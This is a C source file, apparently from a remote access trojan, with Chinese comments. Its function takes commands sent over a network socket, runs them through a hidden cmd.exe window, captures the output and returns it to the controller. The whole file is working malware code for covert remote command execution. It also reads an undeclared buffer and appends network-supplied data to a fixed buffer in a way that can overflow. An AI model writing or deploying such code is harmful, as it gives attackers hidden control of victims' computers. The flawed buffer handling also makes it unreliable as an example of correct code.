#include "Header.h"
#include "RatProto.h"

//////////////////////////////////////////////////////////////////////////
//响应CMD消息
BOOL CmdReply(SOCKET sockfd, int dwRecvSize) {
	SECURITY_ATTRIBUTES	sa;
	sa.nLength = sizeof(sa);
	sa.lpSecurityDescriptor = 0;
	sa.bInheritHandle = TRUE;

	HANDLE hReadPipe1, hWritePipe1;//单管道通信
	CreatePipe(&hReadPipe1, &hWritePipe1, &sa, 0);
	STARTUPINFO	si;//初始化窗口属性
	memset(&si, 0, sizeof(si));
	GetStartupInfo(&si);
	si.cb = sizeof(si);
	si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;//隐藏窗口不出现
	si.wShowWindow = SW_HIDE;//隐藏窗口不出现
	si.hStdOutput = si.hStdError = hWritePipe1;//重定向输出
	char szCmd[MAXLENGTH] = "cmd.exe /c";
	int dwSize = ((RatProto*)szRecvCmd)->RatLen - sizeof(RatProto);
	strncat(szCmd, szRecvCmd + sizeof(RatProto), dwSize);//拼接命令
	PROCESS_INFORMATION	pInfo;
	memset(&pInfo, 0, sizeof(PROCESS_INFORMATION));
	CreateProcessA(NULL, szCmd, NULL, NULL, 1, 0, NULL, NULL, &si, &pInfo);
	memset(szCmd, 0, MAXLENGTH);
	int	dwRead;
	int nRet = PeekNamedPipe(hReadPipe1, szCmd, MAXLENGTH, (LPDWORD)&dwRead, NULL, NULL);//获取管道当前数据
	for (int i = 0; i < 5 && dwRead == 0; i++) {
		Sleep(100);
		nRet = PeekNamedPipe(hReadPipe1, szCmd, MAXLENGTH, (LPDWORD)&dwRead, NULL, NULL);
	}
	if (dwRead) {//如果有数据则取出
		nRet = ReadFile(hReadPipe1, szCmd, dwRead, (LPDWORD)&dwRead, 0);
		if (!nRet) {
			sprintf(szCmd, "%s", "CMD COMMAND EXCUTE ERROR!");
		}
	}
	dwSize = sizeof(RatProto) + strlen(szCmd) + 1;
	char* pData = (char*)malloc(dwSize);
	if (pData) {
		RatProto ratPro;
		ratPro.RatId = CMD_REPLY;
		ratPro.RatLen = dwSize;
		memcpy(pData, &ratPro, sizeof(RatProto));
		pData += sizeof(RatProto);
		sprintf(pData, "%s", szCmd);
		pData -= sizeof(RatProto);
		SendCmd(sockfd, pData, dwSize);
		free(pData);
		return TRUE;
	}
	else {
		return FALSE;
	}
}